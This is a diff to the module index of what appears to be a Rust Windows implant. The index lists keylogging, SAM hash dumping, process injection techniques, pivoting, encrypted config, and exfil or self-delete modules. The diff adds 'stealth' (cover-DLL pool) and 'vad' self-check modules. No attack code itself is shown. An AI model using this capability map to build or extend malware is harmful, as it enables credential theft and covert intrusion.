@@ -25,8 +25,10 @@
 //! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
 //! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
 //! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
-//! - [`inject`] / [`tp`] / [`fls`] / [`kits`] — process injection (incl.
-//!   thread-pool party and FLS callback) + CS-style kit seams.
+//! - [`inject`] / [`tp`] / [`fls`] / [`kits`] / [`vad`] — process injection
+//!   (incl. thread-pool party and FLS callback) + CS-style kit seams + VAD
+//!   self-check. [`stealth`] holds cover-DLL pool + RX protect constants
+//!   (host-testable).
 //! - [`env_keying`] — environment-keyed config encryption layers.
 //! - [`task_guard`] — crash-guarded task execution (setjmp-style snapshot).
 //! - [`trex`] — target-environment assessment + cleanup/delivery/melt/exfil.
@@ -57,6 +59,8 @@ pub mod hashdump;
 // inject was declared WITHOUT a cfg gate in the shell crate before the split
 // (its internals carry their own gates); keep that exact form.
 pub mod inject;
+// Cover-DLL pool + RX protect constants — host-testable (no Windows APIs).
+pub mod stealth;
 #[cfg(target_os = "windows")]
 pub mod keylog;
 // kits additionally carries a file-level `#![cfg(target_os = "windows")]`;
@@ -81,3 +85,5 @@ pub mod task_guard;
 pub mod tp;
 #[cfg(target_os = "windows")]
 pub mod trex;
+#[cfg(target_os = "windows")]
+pub mod vad;
